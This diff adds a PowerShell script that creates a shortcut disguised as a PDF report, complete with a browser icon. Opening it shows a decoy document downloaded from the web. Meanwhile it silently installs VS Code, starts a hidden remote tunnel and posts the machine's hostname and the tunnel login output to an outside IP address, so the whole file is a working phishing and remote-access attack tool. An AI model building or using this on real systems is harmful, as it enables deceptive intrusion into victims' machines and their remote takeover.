@@ -1,0 +1,41 @@
+$EXEPath = Join-Path -Path $env:windir -ChildPath '\System32\WindowsPowerShell\v1.0\powershell.exe'
+$decoyURL = "https://forum.mn/uploads/site/1126/res_mat/NGO_final_report_english.pdf"
+$decoyPath = Join-Path -Path $env:TEMP -ChildPath "\SecurityReport.pdf"
+$tempPath = Join-Path -Path $env:TEMP -ChildPath "\vscode"
+$code = Join-Path -Path $env:TEMP -ChildPath "\vscode\bin\code.cmd"
+# Drop and open the decoy file
+$pay = @"
+# Download the decoy document
+Invoke-WebRequest -Uri $decoyURL -OutFile $decoyPath
+Start-Process -FilePath $decoyPath
+# Malicious operations (VSCode CLI tunnel)
+if (!(Test-Path -Path $tempPath)) {
+    New-Item -ItemType Directory -Path $tempPath | Out-Null
+}
+iwr -uri "https://vscode.download.prss.microsoft.com/dbazure/download/stable/cd4ee3b1c348a13bafd8f9ad8060705f6d4b9cba/VSCode-win32-x64-1.96.4.zip" -OutFile "$env:TEMP\vscode.zip" -UseBasicParsing
+Expand-Archive -Path "vscode.zip" -DestinationPath $tempPath
+cd $tempPath\bin
+& $code tunnel user logout
+Start-Sleep -Seconds 3
+Start-Process -FilePath $code -ArgumentList "tunnel", "--name", "TNAME" -RedirectStandardOutput $tempPath\output.txt  -WindowStyle Hidden -PassThru
+#Exfiltrate github code and hostname
+$hostnm = hostname 
+Start-Sleep -Seconds 3
+$send = Get-Content "$tempPath\output.txt"
+$sendtot = $hostnm + " " + $send 
+Start-Job -ScriptBlock {
+    iwr -uri "http://192.168.22.129:8080" -Method Post -Body $args[0]
+} -ArgumentList $sendtot
+"@
+
+
+
+$arguments = " -nop -c $pay -WindowStyle Hidden -PassThru"
+$LNKName = "SecurityReport.pdf"
+$obj = New-Object -ComObject WScript.Shell
+$link = $obj.CreateShortcut((Get-Location).Path + "\" + $LNKName + ".lnk")
+$link.WindowStyle = '7'
+$link.TargetPath = $EXEPath
+$link.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,0"
+$link.Arguments = $arguments
+$link.Save()
